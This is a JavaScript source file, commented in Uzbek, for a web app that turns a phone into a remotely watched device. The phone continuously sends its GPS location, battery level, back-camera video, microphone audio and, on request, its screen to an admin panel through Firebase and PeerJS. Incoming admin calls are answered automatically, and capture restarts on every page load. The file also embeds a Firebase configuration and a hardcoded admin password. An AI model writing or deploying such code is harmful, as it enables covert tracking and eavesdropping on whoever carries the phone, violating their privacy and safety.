// 1. FIREBASE KONFIGURATSIYASI
const firebaseConfig = {
    apiKey: "AIzaSyBhzWWFFgrOH84J2RIW5o7l_8192iPtbOg",
    authDomain: "code-vibe-df610.firebaseapp.com",
    projectId: "code-vibe-df610",
    databaseURL: "https://code-vibe-df610-default-rtdb.firebaseio.com",
    storageBucket: "code-vibe-df610.firebasestorage.app",
    messagingSenderId: "747762490655",
    appId: "1:747762490655:web:125516814620784cf3a42a",
    measurementId: "G-3QE6F8LWZ1"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const adminPass = "7777";

let peer = null;
let adminPeer = null;
let localStream = null;
let currentActiveCallId = null;
let isTalking = false;
let map = null;
let marker = null;

// --- LOG TIZIMI (Xatolarni Firebase orqali Adminga yuborish) ---
function sendLog(msg) {
    const id = peer ? peer.id : 'no-id';
    db.ref('devices/' + id + '/logs').push({
        time: new Date().toLocaleTimeString(),
        message: msg
    });
}

window.onerror = (m, u, l) => sendLog(`Xato: ${m} | Qator: ${l}`);

// SAHIFA YUKLANGANDA
window.onload = () => {
    const role = localStorage.getItem('myRTC_role');
    const name = localStorage.getItem('myRTC_deviceName');
    if (role === 'user' && name) startUserLogic(name);
    else if (role === 'admin') openAdmin(true);
};

function goHome() {
    localStorage.clear();
    window.location.reload();
}

// --- USER MODE (TELEFON) ---
async function openUser() {
    let name = prompt("Ismingiz:");
    if (!name) return;
    localStorage.setItem('myRTC_role', 'user');
    localStorage.setItem('myRTC_deviceName', name);
    startUserLogic(name);
}

async function startUserLogic(deviceName) {
    document.getElementById('main-ui').style.display = 'none';
    peer = new Peer();

    peer.on('open', (id) => {
        db.ref('devices/' + id).set({ name: deviceName, status: 'online' });
        db.ref('devices/' + id).onDisconnect().remove();
        sendLog("Telefon onlayn. ID: " + id);
        
        // GPS
        navigator.geolocation.watchPosition(p => {
            db.ref('devices/' + id + '/location').set({
                lat: p.coords.latitude, lng: p.coords.longitude
            });
        }, e => sendLog("GPS xatosi: " + e.message));

        // Batareya
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                const upd = () => db.ref('devices/' + id + '/info').update({ battery: Math.floor(b.level * 100) + "%" });
                upd(); b.onlevelchange = upd;
            });
        }
    });

    try {
        // Kamerani olish (Ideal sozlamalar bilan)
        localStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: "environment" } }, 
            audio: true 
        });
        sendLog("Kamera va mikrofon tayyor.");

        peer.on('call', async (call) => {
            sendLog("Admin ulandi...");
            if (call.metadata && call.metadata.type === 'getScreen') {
                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                call.answer(screenStream);
                sendLog("Ekran uzatish boshlandi.");
            } else {
                call.answer(localStream);
                // Admin ovozini eshitish
                call.on('stream', s => {
                    const a = new Audio(); a.srcObject = s; a.play();
                });
            }
        });
    } catch (e) {
        sendLog("Media xatosi: " + e.message);
        alert("Ruxsat berilmadi!");
    }
}

// --- ADMIN MODE (KOMPYUTER) ---
function openAdmin(auto = false) {
    if (!auto && prompt("Parol:") !== adminPass) return;
    localStorage.setItem('myRTC_role', 'admin');
    document.getElementById('main-ui').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'block';
    document.getElementById('top-nav').style.display = 'flex';

    if (!adminPeer) adminPeer = new Peer();

    db.ref('devices').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const btn = document.createElement('button');
            btn.className = "btn-user-select";
            btn.innerText = child.val().name;
            btn.onclick = () => connectToDevice(child.key, child.val().name);
            list.appendChild(btn);
        });
    });
}

function connectToDevice(id, name) {
    if (currentActiveCallId) {
        db.ref('devices/' + currentActiveCallId + '/logs').off();
        db.ref('devices/' + currentActiveCallId + '/location').off();
    }
    currentActiveCallId = id;
    document.getElementById('target-name').innerText = "Qurilma: " + name;

    // Loglarni ko'rsatish
    const logBox = document.getElementById('console-logs');
    logBox.innerHTML = "";
    db.ref('devices/' + id + '/logs').limitToLast(10).on('child_added', s => {
        const p = document.createElement('div');
        p.innerText = `> [${s.val().time}] ${s.val().message}`;
        logBox.prepend(p);
    });

    // GPS
    db.ref('devices/' + id + '/location').on('value', s => {
        if (s.val()) initMap(s.val().lat, s.val().lng);
    });

    // 1. Kamera ulanishi
    const videoCall = adminPeer.call(id, null);
    videoCall.on('stream', s => {
        document.getElementById('remoteVideo').srcObject = s;
    });

    // 2. Ekran ulanishi
    const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
    screenCall.on('stream', s => {
        document.getElementById('screenVideo').srcObject = s;
    });
}

function initMap(lat, lng) {
    if (!map) {
        map = L.map('map').setView([lat, lng], 16);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        marker = L.marker([lat, lng]).addTo(map);
    } else { marker.setLatLng([lat, lng]); map.setView([lat, lng]); }
}

async function toggleTalk() {
    const btn = document.getElementById('talkBtn');
    if (!isTalking) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
            adminPeer.call(currentActiveCallId, s);
            isTalking = true; btn.innerText = "GAPIRILMOQDA..."; btn.style.background = "red";
        } catch (e) { alert("Mikrofon xatosi!"); }
    } else {
        window.location.reload();
    }
}
